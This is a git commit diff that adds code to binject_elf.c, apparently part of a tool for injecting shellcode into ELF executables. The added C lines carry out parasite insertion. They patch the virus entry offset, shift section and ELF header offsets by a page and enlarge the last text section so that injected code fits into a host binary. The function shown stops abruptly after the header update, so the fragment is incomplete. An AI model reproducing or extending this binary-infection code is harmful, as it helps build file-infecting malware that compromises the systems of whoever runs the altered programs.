801cf274b17e8870dca776e44b36dee5a0fcbcc0
Satoshi32 <97588974+Satoshi32@users.noreply.github.com>
2022-12-09 23:36:01 +0100

    Update binject_elf.c

--- binject_elf.c
+++ binject_elf.c
@@ -39,6 +39,37 @@ int binject_ELF(char *file,char *shellcode,int method)
 
 		++phdr;
 	}
+	  if (offset == 0) goto error;
+
+/* patch the offset */
+	*(long *)&v[vhoff] = offset;
+
+/* read the shdr's */
+
+	if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) goto error;
+	if (read(fd, (void *)sdata, slen) != slen) goto error;
+
+/* update the shdr's to reflect the insertion of the parasite */
+
+	for (shdr = (Elf32_Shdr *)sdata, i = 0; i < ehdr.e_shnum; i++) {
+		if (shdr->sh_offset >= offset) {
+			shdr->sh_offset += PAGE_SIZE;
+/* is this the last text section? */
+		} else if (shdr->sh_addr + shdr->sh_size == evaddr) {
+/* if its not strip safe then we cant use it */
+			if (shdr->sh_type != SHT_PROGBITS) goto error;
+
+			shdr->sh_size += vlen;
+		}
+
+		++shdr;
+	}
+
+/* update ehdr to reflect new offsets */
+
+	oshoff = ehdr.e_shoff;
+	if (ehdr.e_shoff >= offset) ehdr.e_shoff += PAGE_SIZE;
+
 }
            
   
